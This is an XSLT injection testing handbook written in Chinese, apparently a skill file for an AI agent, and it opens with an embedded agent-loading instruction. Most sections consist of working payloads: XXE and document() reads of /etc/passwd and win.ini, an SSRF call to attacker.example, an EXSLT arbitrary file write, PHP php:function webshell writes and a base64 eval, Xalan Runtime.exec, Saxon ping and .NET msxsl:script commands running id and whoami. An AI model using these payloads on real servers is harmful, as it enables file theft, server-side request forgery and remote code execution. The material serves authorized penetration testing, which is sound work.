# 技能：XSLT注入——测试手册

> **AI加载指令**：XSLT注入发生在受攻击者影响的XSLT在服务器端被编译/执行时。首先映射**处理器家族**（Java/.NET/PHP/libxslt）。然后根据平台链式使用**document()**、**外部实体**、**EXSLT**或**嵌入式脚本/扩展函数**。**仅授权测试**；许多有效载荷具有破坏性。路由说明：如果输入是通用XML解析且可能不会通过XSLT，则交叉加载`xxe-xml-external-entity`；如果你关心外发的`document(http:...)`请求，则交叉加载`ssrf-server-side-request-forgery`。

---

## 0. 快速入门

1. **查找汇点**：名为`xslt`、`stylesheet`、`transform`、`template`、SOAP样式表、报告生成器、XML→HTML转换器的参数。
2. **探测反射**：注入唯一命名空间或`xsl:value-of select="'marker'"`——如果输出变化，则可能执行。
3. **指纹识别**处理器（§1）。
4. **按家族升级**：**document()** / **XXE**（§2–3）、**EXSLT写入**（§4）、**PHP**（§5）、**Java**（§6）、**.NET**（§7）。

**快速探测**（无害标记）：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. 设备检测

在表达式中使用标准的**system-property**读取：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**典型指纹**（示例，非穷尽）：

| 信号 | 可能的引擎 |
|------|-----------|
| `Apache Software Foundation` / Xalan标记 | Xalan (Java) |
| `Saxonica` / Saxon URI提示 | Saxon |
| `libxslt` / GNOME堆栈 | libxslt (C, 通常通过PHP、nginx模块等) |
| Microsoft URL / MSXML字符串 | MSXML / .NET XSLT堆栈 |

使用结果选择§5–§7路径。

---

## 2. 外部实体（通过XSLT的XXE）

XSLT 1.0允许在解析器允许DTD时，在样式表或源中使用**基于DTD的实体**：

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**注意**：硬化解析器禁用外部DTD——此处失败并不能排除其他XSLT向量（见§3）。

---

## 3. 通过`document()`读取文件

`document()`将另一个XML文档加载到节点集中；本地文件通常解析为XML（嘈杂），但**错误和部分读取**仍可能泄露。

**Unix示例**：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows示例**：

```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / 跨带外**：

```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

如果内联数据未返回到客户端，则通过**基于错误**或**时间**的观察进行链式操作。

---

## 4. 通过EXSLT (`exslt:document`)写入文件

当**EXSLT common**扩展启用时：

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**影响**：在路径权限允许的任意文件写入——通常通过webroot、cron路径或包含点进行**远程代码执行**。

---

## 5. 通过PHP (`php:function`)远程代码执行

需要PHP XSLT与**`registerPHPFunctions()`**样式的暴露（应用程序配置错误）。命名空间：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**目录列表**：

```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**危险模式**（历史滥用——仅在实验室验证）：

- `php:function('assert', string($payload))` — 环境依赖，通常已弃用/移除；在旧应用程序中与`include`/`require`链式使用。
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — **webshell写入**当可调用项被鲁莽地白名单时。
- `preg_replace`与**`/e`**修饰符（旧版PHP）——替换字符串被**作为PHP评估**；metasploit样式的链式通常包装**base64_decode**的blob以走私**meterpreter**（或其他）预置有效载荷。PHP 7+中移除；仅适用于古老的运行时。

**旧版PHP等效**（说明`/e` + base64模式——仅在实验室）：

```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

仅在XSLT中暴露，如果`php:function`允许用户样式表暴露`preg_replace`（罕见且关键配置错误）。

**测试者注意**：现代PHP硬化通常**阻止**这些；RCE的缺失并不能排除**document()** / **XXE**。

---

## 6. 通过JAVA（SAXON / XALAN扩展）远程代码执行

Java引擎可能暴露**扩展函数**映射到静态方法。示例出现在历史公告中；确切语法取决于**版本和扩展绑定**。

**说明模式**（概念性——调整到允许的扩展命名空间和API）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon样式的静态Java集成**（高度配置依赖）：

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

将`192.0.2.1`替换为你的实验室监听器/文档IP（RFC 5737 TEST-NET）。

**操作指导**：如果扩展被禁用（常见的安全默认值），则转向**document()**、SSRF或**反序列化**，而不是每个XSLT端点都启用扩展。

---

## 7. 通过.NET (`msxsl:script`)远程代码执行

当Microsoft XSLT**脚本块**被允许时：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**默认安全配置**通常禁用脚本——将此视为**启用时**的行为。

---

## 8. 决策树

```text
                    用户影响XSLT或XML转换？
                                    |
                                   否 --> 停止（超出范围）
                                    |
                                   是
                                    |
                    +---------------+---------------+
                    |                               |
             输出反映                       无反射
             注入逻辑？                    尝试盲目通道
                    |                               |
                    v                               v
            system-property()                 错误，带外，时间
            指纹识别供应商                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/文件
    EXSLT写入  扩展？      |                   |
        |           |           C# Process         EXSLT？
        v           v           v                   v
    文件读/写     rt/exec      cmd.exe /c         映射证据
```

---

## 所有有效载荷（PAT）注意

**PayloadsAllTheThings**项目记录了许多注入类别；对于**XSLT**，维护者笔记指出**没有专门的维护工具**部分可与SQLi/XSS工具链相比——利用是**处理器和配置特定的**，由代理/手动有效载荷和自定义脚本驱动。计划时间进行**本地实验室重现**，使用与目标相同的引擎/版本（如果可能）。

---

## 工具（实用）

| 类别 | 示例 |
|------|------|
| 代理 / 手动 | Burp Suite, OWASP ZAP — 重放样式表有效载荷，观察响应和错误 |
| XML/XSLT实验室 | 匹配**确切**处理器（PHP libxslt、Java Saxon版本、.NET框架）在虚拟机中 |
| 跨带外 | 合作者 / 私有回调服务器用于`document('http://…')` |

没有单一通用扫描器可以替代**版本特定**行为验证。

---

## 相关

- **xxe-xml-external-entity** — DTD实体硬化，通用XML解析器（`../xxe-xml-external-entity/SKILL.md`）。
- **ssrf-server-side-request-forgery** — 当`document(http:…)`或实体URL导致服务器获取时（`../ssrf-server-side-request-forgery/SKILL.md`）。
